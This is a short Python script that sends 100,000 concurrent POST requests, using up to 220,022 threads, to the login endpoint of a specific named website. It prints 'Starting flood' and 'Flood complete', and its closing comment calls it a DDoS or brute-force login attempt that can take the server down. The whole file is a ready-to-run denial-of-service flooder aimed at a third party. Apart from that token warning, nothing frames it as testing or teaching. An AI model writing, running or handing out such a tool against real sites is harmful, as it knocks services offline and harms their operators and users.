import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

API_URL = "https://cmgtradecommodityx.com/user/login"

# Set your payload here
payload = {
    "email": "test@example.com",
    "password": "123456"
}

# Headers if needed
headers = {
    "Content-Type": "application/json",
    "Accept": "application/json"
}

# Function to send one request
def send_request(i):
    try:
        response = requests.post(API_URL, json=payload, headers=headers, timeout=5)
        print(f"[{i}] {response.status_code} - {response.text[:50]}")
    except requests.exceptions.RequestException as e:
        print(f"[{i}] ERROR - {e}")
        
# Start time
start = time.time()

# Simulate 1000 users sending requests using threads .. this is very dangour
total_billon_requests = 100000                        
max_threads = 220022

print(f"Starting flood: {total_billon_requests} requests with {max_threads} threads")

with ThreadPoolExecutor(max_workers=max_threads) as executor:
    futures = [executor.submit(send_request, i) for i in range(total_billon_requests)]

    # Optional: Wait for all to finish
    for future in as_completed(futures):
        pass

print("Flood complete.")
print(f"Total time: {time.time() - start:.2f}s")

# ⚠️ Critical Warning:
#  DDoS attack or brute-force login attempt. Sending millions/billions of requests to a website with threading:
# Can take the server down